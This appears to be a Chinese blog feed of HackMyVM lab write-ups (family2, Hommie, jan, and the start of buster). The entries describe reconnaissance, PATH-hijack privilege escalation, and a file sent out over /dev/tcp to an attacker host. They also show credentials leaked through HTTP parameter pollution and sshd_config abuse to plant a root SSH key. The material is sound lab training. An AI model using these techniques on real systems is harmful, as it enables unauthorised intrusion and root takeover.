class="number">13</span> <span class="title class_">Feb</span> <span class="number">2025</span> <span class="number">10</span><span class="symbol">:</span><span class="number">11</span><span class="symbol">:</span><span class="number">39</span> <span class="variable constant_">AM</span> <span class="variable constant_">CET</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x date</span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line"><span class="title class_">Thu</span> <span class="number">13</span> <span class="title class_">Feb</span> <span class="number">2025</span> <span class="number">10</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:</span><span class="number">01</span> <span class="variable constant_">AM</span> <span class="variable constant_">CET</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>export <span class="variable constant_">PATH</span>=<span class="regexp">/home/dad</span><span class="symbol">:</span><span class="variable">$PATH</span></span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>/opt/clock</span><br><span class="line">root<span class="variable">@family2</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>这样子把环境变量改成用我们目录下的date，然后内容是<code>/bin/bash</code>这样就直接得到root的shell了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机还是挺好玩的，结合了很多小知识点，这里web端就直接给了id_rsa,总体难度还是比family1简单一点。<br>学到了用<code>enum4linux -a</code> 这个方法扫描所有有smb的靶机，得到用户名<br>提权部分是主要考查环境变量，加深我们对环境变量的理解，用PATH劫持获得shell</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Hommie</title>
    <url>/posts/61994.html</url>
    <content><![CDATA[<p>HMV-Hommie靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
<h1 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p><img src="https://pic1.imgdb.cn/item/679a3ec2d0e0a243d4f87a20.png" alt="|700"><br>发现有三个端口  ftp ssh http<br>先看看ftp能不能匿名登录<br><img src="https://pic1.imgdb.cn/item/679a3ec6d0e0a243d4f87a21.png" alt="|550"><br>尝试把反弹shell文件上传  无法得到shell<br>80端口<br><img src="https://pic1.imgdb.cn/item/679a3ec8d0e0a243d4f87a22.png"><br>得到两个用户 alexia nobody   并且提示我们要得到alexia的id_rsa<br>目录扫描<br><img src="https://pic1.imgdb.cn/item/679a3eccd0e0a243d4f87a23.png"><br><img src="https://pic1.imgdb.cn/item/679a3ed0d0e0a243d4f87a24.png"><br>使用了两个常用的目录字典都没有扫描到 说明大概率就是没有其他目录<br>web如果没有信息就说明信息收集还不过     – 重新用nmap扫描  看看有没有其他服务<br> <img src="https://pic1.imgdb.cn/item/679a3ef9d0e0a243d4f87a28.png"><br> 有新的发现  还有开放dhcpc tftp 服务<br> 根据前面的提示  get id_rsa  成功得到rsa私钥  登录到ssh<br> <img src="https://pic1.imgdb.cn/item/679a3f04d0e0a243d4f87a2d.png"><br> 成功拿到shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3f07d0e0a243d4f87a2e.png"><br>没有sudo指令  查suid  不一样的就是的第一个<code>/opt/showMetheKey</code><br>执行这个文件之后 发现是一个rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a2f.png"><br>这个私钥是当前用户的  我们要想办法得到root用户的<br>现在将这个文件下载到本地 <code>cat showMetheKey &gt; /dev/tcp/192.168.240.83/1234</code><br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a30.png"><br>用ida分析这个程序<br><img src="https://pic1.imgdb.cn/item/679a3f80d0e0a243d4f87a3a.png"></p>
<p>所以修改环境变量 这样子就可以得到root的rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f73d0e0a243d4f87a33.png"><br><img src="https://pic1.imgdb.cn/item/679a3f7ad0e0a243d4f87a38.png"><br>成功登录到root<br><img src="https://pic1.imgdb.cn/item/679a3f7fd0e0a243d4f87a39.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-jan</title>
    <url>/posts/55566.html</url>
    <content><![CDATA[<p>HMV-jan靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a2dc3ad0e0a243d4fbdfe0.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.147  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">10</span>:<span class="number">22</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.147</span> (<span class="number">192.168</span>.<span class="number">240.147</span>)</span><br><span class="line">Host is up (<span class="number">0.0027</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh     OpenSSH <span class="number">9.9</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">256</span> <span class="number">2</span>c:<span class="number">0</span>b:<span class="number">57</span>:a2:b3:e2:<span class="number">0</span>f:<span class="number">6</span>a:c0:<span class="number">61</span>:f2:b7:<span class="number">1</span>f:<span class="number">56</span>:b4:<span class="number">42</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">45</span>:<span class="number">97</span>:b0:<span class="number">2</span>b:<span class="number">48</span>:<span class="number">9</span>b:<span class="number">4</span>a:<span class="number">36</span>:<span class="number">8</span>e:db:<span class="number">44</span>:bd:<span class="number">3</span>f:<span class="number">15</span>:cf:<span class="number">32</span> (ED25519)</span><br><span class="line"><span class="number">8080</span><span class="symbol">/tcp</span> open  http    Golang net<span class="symbol">/http</span> server</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span>).</span><br><span class="line">| <span class="params">fingerprint-strings:</span> </span><br><span class="line">|   FourOhFourRequest, GetRequest, <span class="params">HTTPOptions:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.0</span> <span class="number">200</span> OK</span><br><span class="line">|     <span class="params">Date:</span> Wed, <span class="number">05</span> Feb <span class="number">2025</span> <span class="number">02</span>:<span class="number">22</span>:<span class="number">24</span> GMT</span><br><span class="line">|     <span class="params">Content-Length:</span> <span class="number">45</span></span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     Welcome to our Public Server. Maybe Internal.</span><br><span class="line">|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, <span class="params">Socks5:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|     Request</span><br><span class="line">|   <span class="params">OfficeScan:</span> </span><br><span class="line">|     HTTP<span class="symbol">/1.1</span> <span class="number">400</span> Bad <span class="params">Request:</span> missing required Host header</span><br><span class="line">|     <span class="params">Content-Type:</span> text<span class="symbol">/plain</span>; <span class="attr">charset</span><span class="operator">=</span>utf-<span class="number">8</span></span><br><span class="line">|     <span class="params">Connection:</span> close</span><br><span class="line">|_    <span class="params">Request:</span> missing required Host header</span><br><span class="line">|<span class="params">_http-open-proxy:</span> Proxy might be redirecting requests</span><br></pre></td></tr></table></figure></div>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl <span class="number">192.168</span><span class="number">.240</span><span class="number">.147</span>:<span class="number">8080</span>                         </span><br><span class="line">Welcome <span class="keyword">to</span> our <span class="built_in">Public</span> <span class="keyword">Server</span>. Maybe <span class="type">Internal</span>.</span><br></pre></td></tr></table></figure></div>
<p>没有什么有用的信息,扫一下目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="regexp">/tmp]</span></span><br><span class="line"><span class="regexp">└─# dirsearch -u http:/</span><span class="regexp">/192.168.240.147:8080</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/python</span>3/dist-packages/dirsearch/dirsearch.<span class="symbol">py:</span><span class="number">23</span>: <span class="symbol">DeprecationWarning:</span> pkg_resources is deprecated <span class="keyword">as</span> an API. See <span class="symbol">https:</span>/<span class="regexp">/setuptools.pypa.io/en</span><span class="regexp">/latest/pkg</span>_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_||| _) (<span class="regexp">/_(_|| (_| )</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Output File: /root</span><span class="regexp">/tmp/reports</span><span class="regexp">/http_192.168.240.147_8080/</span>_25-<span class="number">0</span>2-<span class="number">0</span>5_10-<span class="number">25</span>-<span class="number">54</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="symbol">Target:</span> <span class="symbol">http:</span>/<span class="regexp">/192.168.240.147:8080/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">54</span>] <span class="symbol">Starting:</span> </span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">54</span>] <span class="number">301</span> -   <span class="number">57</span>B  - <span class="regexp">/%2e%2e/</span><span class="regexp">/google.com  -&gt;  /</span>%<span class="number">252E</span>%<span class="number">252E</span>/google.com   </span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">57</span>] <span class="number">301</span> -   <span class="number">65</span>B  - <span class="regexp">/axis2/</span><span class="regexp">/axis2-web/</span>HappyAxis.jsp  -&gt;  <span class="regexp">/axis2/axis</span>2-web/HappyAxis.jsp</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">57</span>] <span class="number">301</span> -   <span class="number">59</span>B  - <span class="regexp">/axis2-web/</span><span class="regexp">/HappyAxis.jsp  -&gt;  /axis</span>2-web/HappyAxis.jsp</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">57</span>] <span class="number">301</span> -   <span class="number">54</span>B  - <span class="regexp">/axis/</span><span class="regexp">/happyaxis.jsp  -&gt;  /axis</span><span class="regexp">/happyaxis.jsp     </span></span><br><span class="line"><span class="regexp">[10:25:58] 301 -   87B  - /</span>Citrix/<span class="regexp">/AccessPlatform/auth</span><span class="regexp">/clientscripts/cookies</span>.js  -&gt;  <span class="regexp">/Citrix/</span>AccessPlatform/auth/clientscripts/cookies.js</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">59</span>] <span class="number">301</span> -   <span class="number">77</span>B  - <span class="regexp">/engine/classes</span><span class="regexp">/swfupload/</span><span class="regexp">/swfupload_f9.swf  -&gt;  /engine</span><span class="regexp">/classes/swfupload</span><span class="regexp">/swfupload_f9.swf</span></span><br><span class="line"><span class="regexp">[10:25:59] 301 -   74B  - /engine</span><span class="regexp">/classes/swfupload</span><span class="regexp">//swfupload</span>.swf  -&gt;  <span class="regexp">/engine/classes</span><span class="regexp">/swfupload/swfupload</span>.swf</span><br><span class="line">[<span class="number">10</span>:<span class="number">25</span>:<span class="number">59</span>] <span class="number">301</span> -   <span class="number">62</span>B  - <span class="regexp">/extjs/resources</span><span class="regexp">//charts</span>.swf  -&gt;  <span class="regexp">/extjs/resources</span><span class="regexp">/charts.swf</span></span><br><span class="line"><span class="regexp">[10:26:00] 301 -   72B  - /html</span><span class="regexp">/js/misc</span><span class="regexp">/swfupload/</span><span class="regexp">/swfupload.swf  -&gt;  /html</span><span class="regexp">/js/misc</span><span class="regexp">/swfupload/swfupload</span>.swf</span><br><span class="line">[<span class="number">10</span>:<span class="number">26</span>:<span class="number">0</span>3] <span class="number">400</span> -   <span class="number">24</span>B  - <span class="regexp">/redirect                                         </span></span><br><span class="line"><span class="regexp">[10:26:03] 200 -   16B  - /robots</span>.txt                                   </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.240.147:8080/robots.txt</span><br><span class="line">/redirect</span><br><span class="line">/credz</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.240.147:8080/robots.txt</span><br><span class="line">/redirect</span><br><span class="line">credz                                      </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.240.147:8080//credz    </span><br><span class="line">&lt;a href=<span class="string">&quot;/credz&quot;</span>&gt;Moved Permanently&lt;/a&gt;.        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.240.147:8080/redirect</span><br><span class="line">Parameter <span class="string">&#x27;url&#x27;</span> needed.            </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.240.147:8080/redirect?url=1</span><br><span class="line">Only accessible internally.                          </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里给了两个目录，但是分别单独访问都没有结果，在redirect用了url参数也没用<br>之前做过一个靶机有也是给了目录好像是secret 和 home 后面用了这两个的组合路径<br>这里也试试  –&gt; 还是没用  扫描二级目录也没有<br>原来这里的url提示是url的参数传credz并且要组合传，让http解析最后一个参数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="regexp">/tmp]</span></span><br><span class="line"><span class="regexp">└─# curl &#x27;http:/</span><span class="regexp">/192.168.240.147:8080/redirect</span>?url=<span class="number">1</span>&amp;url=<span class="regexp">/credz&#x27;</span></span><br><span class="line"><span class="regexp">ssh/</span>EazyLOL </span><br></pre></td></tr></table></figure></div>
<p>得到ssh的用户名和密码  用户名就是ssh</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>有一个sudo命令可以让ssh服务重启</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>~<span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> ssh on <span class="symbol">jan:</span></span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Runas</span> <span class="keyword">and</span> <span class="title class_">Command</span>-specific defaults <span class="keyword">for</span> <span class="symbol">ssh:</span></span><br><span class="line">    <span class="title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> ssh may run the following commands on <span class="symbol">jan:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /sbin/service sshd restart</span><br></pre></td></tr></table></figure></div>
<p>所以目标就是更改ssh的配置文件，让ssh服务重启 sshd_config（修改的是客户端的内容）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">X11UseLocalhost <span class="built_in">yes</span></span>                                                                           </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PermitTTY <span class="built_in">yes</span></span>                                                                                 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PrintMotd <span class="built_in">yes</span></span>                                                                                 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PrintLastLog <span class="built_in">yes</span></span>                                                                              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">TCPKeepAlive <span class="built_in">yes</span></span>                                                                              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PermitUserEnvironment no</span>                                                                      </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Compression delayed</span>                                                     </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ClientAliveInterval 0</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ClientAliveCountMax 3</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">UseDNS no</span>                                                               </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PidFile /run/sshd.pid</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">MaxStartups 10:30:100</span>                                                   </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">PermitTunnel no</span>                                                         </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ChrootDirectory none</span>                              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">VersionAddendum none</span>                 </span><br><span class="line">                                      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">no default banner path</span>              </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Banner /root/root.txt</span>                </span><br><span class="line">                                      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">override default of no subsystems</span>   </span><br><span class="line">Subsystem       sftp    internal-sftp </span><br><span class="line">                                      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example of overriding settings on a per-user basis</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Match User anoncvs</span>                   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      X11Forwarding no</span>         </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      AllowTcpForwarding no</span>    </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      PermitTTY no</span>                                                         </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      ForceCommand cvs server</span>   </span><br></pre></td></tr></table></figure></div>
<p>这里可以修改banner就可以读取任何想要的文件<br>但是直接ssh登录会报错</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jan:</span>/etc/ssh<span class="variable">$ </span>ssh root<span class="variable">@locakhost</span></span><br><span class="line"><span class="regexp">/etc/ssh</span><span class="regexp">/ssh_config: line 23: Bad configuration option: banner</span></span><br><span class="line"><span class="regexp">/etc</span><span class="regexp">/ssh/ssh</span><span class="symbol">_config:</span> terminating, <span class="number">1</span> bad configuration options</span><br></pre></td></tr></table></figure></div>
<p>根据错误信息，把ssh_config中的banner删掉</p>
<p>然后用ssh就可以读到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh <span class="symbol">ssh@</span><span class="number">192.168</span><span class="number">.240</span><span class="number">.147</span></span><br><span class="line">HMV2PRMTERWTFUDNGMBG</span><br><span class="line"><span class="symbol">ssh@</span><span class="number">192.168</span><span class="number">.240</span><span class="number">.147</span><span class="string">&#x27;s password: </span></span><br></pre></td></tr></table></figure></div>
<p>如果要登录到root，我们可以修改</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">AuthorizedKeysFile      .ssh/authorized_keys                                  </span><br></pre></td></tr></table></figure></div>
<p>把.ssh&#x2F;authorized_keys修改成我们自己创的 &#x2F;home&#x2F;ssh&#x2F;authorized_keys  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">jan</span>:~$ echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxliao26atOJyX3C9UgtIxt3RY9S4n921sYgmAxhw5sB58FESP8E+kWMC4QbT2</span><br><span class="line"><span class="attribute">3azUa8zVr76QNhru</span>+LVFTrW5R9SyxDDYQWjfRwDBiSe2X5MNiqoQU4tiW71DGYiO9M0xQNVx5Auvx6Ip6+kJqEpnXoU0Gw4zRxB3HjeEwYIly8HFA</span><br><span class="line"><span class="attribute">TKaOP3Gh7rhwOXJ8gjcF7d6NcnsNbnOeUEArJjDhsax72TIiBYmza0PTg</span>+<span class="number">8</span>YZrjwvDqdZ+swMq5R9SPsn4sLyF5R82wjAajO4ce8qwcIanBxw5KeB</span><br><span class="line"><span class="attribute">fiChtilCaYb0JXH2bNlyQwedGjL2ARtnjgPhIKU</span>/<span class="number">3</span>N42trAcEXDwBCxkLRRGVkgrFDdYN70kcgfo2+<span class="number">7</span>A7hBk2H7EFfY44bGcD9+YDsEqVS38VfxcD</span><br><span class="line"><span class="attribute">HNfM5V1ypS</span>+ZirpY/RXK+<span class="number">46</span>nHfAaieMuhNffS/zegzQEUTR1iHXWvDFOlwS7w3SNiBh4p69NyefputLJEdBhWUrIbsqvIOOzVNC03f7hd0Yq0gsZb</span><br><span class="line"><span class="attribute">vt7g10X4k18Wf7aI</span>/<span class="number">3</span>qg26Yw+LJ9zq1VBSKaon0fTYtxrDGyn3qGeT1dKUyFQzbKkKN19X6VYjlSWzFvEft7lgLixwZnsQabUR8XT0UIwfJbN7FU9</span><br><span class="line"><span class="attribute">j</span>+hQos8PBWXsqZIX1q+by5prOChPXMP9phGofL8q+SrrKdPUZDMxV8Hbw== root@kakeru&#x27; &gt; authorized_keys </span><br></pre></td></tr></table></figure></div>
<p>这里不要直接vi进去粘贴私钥内容，就像这样echo进去（我试过直接粘贴进去但是不行，可能是换行什么的问题)<br>内容改成本机 &#x2F;.ssh&#x2F;id_rsa.pub<br>而且配置文件中需要修改</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">StrictModes <span class="keyword">no</span>  #从<span class="keyword">yes</span>改成<span class="keyword">no</span> 注释删掉</span><br></pre></td></tr></table></figure></div>

<p>得到rootshell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh root@192.168.240.147</span></span><br><span class="line">HMV2PRMTERWTFUDNGMBG</span><br><span class="line">Welcome <span class="built_in">to</span> Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki <span class="keyword">contains</span> <span class="keyword">a</span> large amount <span class="keyword">of</span> how-<span class="built_in">to</span> guides <span class="keyword">and</span> general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;<span class="keyword">https</span>://wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line">You can setup <span class="keyword">the</span> <span class="keyword">system</span> <span class="keyword">with</span> <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">setup-alpine</span></span><br><span class="line"></span><br><span class="line">You may change this message <span class="keyword">by</span> editing /etc/motd.</span><br><span class="line"></span><br><span class="line">jan:~<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">0</span>(root),<span class="number">1</span>(bin),<span class="number">2</span>(daemon),<span class="number">3</span>(sys),<span class="number">4</span>(adm),<span class="number">6</span>(disk),<span class="number">10</span>(wheel),<span class="number">11</span>(floppy),<span class="number">20</span>(dialout),<span class="number">26</span>(tape),<span class="number">27</span>(video)</span><br><span class="line">jan:~<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>



]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-buster</title>
    <url>/posts/7142.html</url>
    <content><![CDATA[<p>HMV-buster复盘,ta0神做的靶机</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a3428cd0e0a243d4fbf739.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.231</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">14</span>:<span class="number">48</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.231</span> (<span class="number">192.168</span>.<span class="number">240.231</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u4 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> c2:<span class="number">91</span>:d9:a5:f7:a3:<span class="number">98</span>:<span class="number">1</span>f:c1:<span class="number">4</span>a:<span class="number">70</span>:<span class="number">28</span>:aa:ba:a4:<span class="number">10</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">3</span>e:<span class="number">1</span>f:c9:eb:c0:<span class="number">6</span>f:<span class="number">24</span>:<span class="number">06</span>:fc:<span class="number">52</span>:<span class="number">5</span>f:<span class="number">2</span>f:<span class="number">1</span>b:<span class="number">35</span>:<span class="number">33</span>:ec (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ec:<span class="number">64</span>:<span class="number">87</span>:<span class="number">04</span>:<span class="number">9</span>a:<span class="number">4</span>b:<span class="number">32</span>:fe:<span class="number">2</span>d:<span class="number">1</span>f:<span class="number">9</span>a:b0:<span class="number">81</span>:d3:<span class="number">7</span>c:cf (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="operator">/</span>wp-admin<span class="symbol">/</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> 